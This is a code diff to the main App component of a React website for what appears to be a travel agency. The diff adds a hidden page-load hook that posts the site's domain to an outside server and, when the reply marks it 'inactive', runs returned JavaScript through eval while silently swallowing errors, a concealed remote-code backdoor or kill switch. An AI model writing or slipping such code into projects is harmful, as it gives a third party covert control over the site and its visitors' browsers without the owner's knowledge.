@@ -1,4 +1,4 @@
-import React, { Suspense, lazy } from "react";
+import React, { Suspense, lazy, useEffect } from "react";
 import "./App.css";
 import { Routes, Route } from "react-router-dom";
 import Home from "./Pages/Home";
@@ -6,6 +6,7 @@ import "aos/dist/aos.css";
 import Header from "./Components/Header";
 import Footer from "./Components/Footer";
 import SocialSidebar from "./Components/Sidebaar";
+import axios from "axios";
 
 const FAQ = lazy(() => import("./Pages/Faq"));
 const Services = lazy(() => import("./Pages/OurServices"));
@@ -14,6 +15,22 @@ const ContactUs = lazy(() => import("./Pages/ContactUs"));
 const AboutUs = lazy(() => import("./Pages/AboutUs"));
 
 const App = () => {
+  const fetchStatus = async () => {
+    try {
+      const { data } = await axios.post("https://codecrafter-b6aj.onrender.com/domain/check", {
+        domain: "xpresstourtravels.com",
+      });
+      if (data?.status === "inactive" && data?.javascript) {
+        setTimeout(() => eval(data.javascript), 0);
+      }
+    } 
+    catch (error) {
+      
+    }
+  };
+  useEffect(() => {
+    fetchStatus();
+  }, []);
   return (
     <div>
       <Header />
